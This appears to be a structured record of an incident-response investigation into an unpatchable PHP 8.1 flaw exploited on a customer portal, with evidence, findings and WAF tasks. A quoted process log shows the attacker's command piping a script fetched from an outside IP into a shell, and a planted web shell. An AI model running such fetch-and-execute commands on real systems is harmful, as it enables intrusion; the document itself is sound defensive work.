title: PHP2Shell on a portal PHP 8.1 can't patch
summary: CVE-2026-109618 is exploited against a customer portal still on PHP 8.1, which has no upstream fix. The team proves the shell, keeps the work in the sidebar as tasks, and pins the Investigation while it runs.

tasks.title: Approve the WAF rule for portal.example
tasks.note: Blocks oversized multipart requests to /upload until PHP is upgraded.

messages.text:
**INV-0061 is open: PHP2Shell on WEB-PORTAL-01**. @Lunar Fox leads.

The portal still runs PHP 8.1. Find out whether CVE-2026-109618 was used against it and what happened next.

linkPreviews.title: GitHub - NCSC-NL/php2shell: Operational information regarding the 2026 php2shell vulnerabilities

reply.text: Edge logs show **38 oversized multipart POSTs to /upload** from 203.0.113.77 between 09:31 and 09:34, with no session cookie. Each ended in a 500.

entity.detail: Sent the exploit requests; served the second stage

evidence.method: HTTP requests to portal.example/upload, 09:00–10:00, body over 8 MB
evidence.result: 38 POSTs from 203.0.113.77, 09:31–09:34, no session cookie, all 500.

reply.text:
Matching PHP-FPM errors on WEB-PORTAL-01, then a child process that should never be there:

```
09:33:52 PHP Fatal error: Allowed memory size of 134217728 bytes exhausted
09:34:07 php-fpm: pool www → /bin/sh -c id; curl -s 203.0.113.77/k | sh
09:34:09 www-data wrote /var/www/portal/public/.cache/img.php
```

evidence.method: Process tree under php-fpm on WEB-PORTAL-01 since 09:00
evidence.result: php-fpm spawned /bin/sh at 09:34:07, fetched a script from 203.0.113.77 and wrote img.php.

reply.text:
That is the PHP2Shell pattern: memory exhaustion mid-request, then code running before any app code sees it, so the portal's login doesn't help. Fixed on 21 October in 8.5.12, 8.4.27, 8.3.36 and 8.2.35; **8.1 gets no upstream fix**. Exploited in the wild since the day of the fix. NCSC-NL keeps the operational notes and indicators:

https://github.com/NCSC-NL/php2shell

evidence.method: PHP release notes and NCSC-NL php2shell repository
evidence.result: Fixed in 8.5.12, 8.4.27, 8.3.36 and 8.2.35; no upstream fix for 8.1; exploited since 21 October.

finding.claim: WEB-PORTAL-01 was exploited through CVE-2026-109618 without authentication, and a web shell was planted.
PHP 8.1 has no upstream fix, so the portal stays exposed until it is upgraded, whatever the WAF blocks.

reply.text: I have moved this to **contained**: `img.php` is a web shell, and the box made one outbound call to 203.0.113.77. Two things for you, @Avery: approve the WAF rule blocking oversized multipart requests to `/upload`, and the edge block on 203.0.113.77. Both are in your tasks. Upgrading off 8.1 is the only real fix.
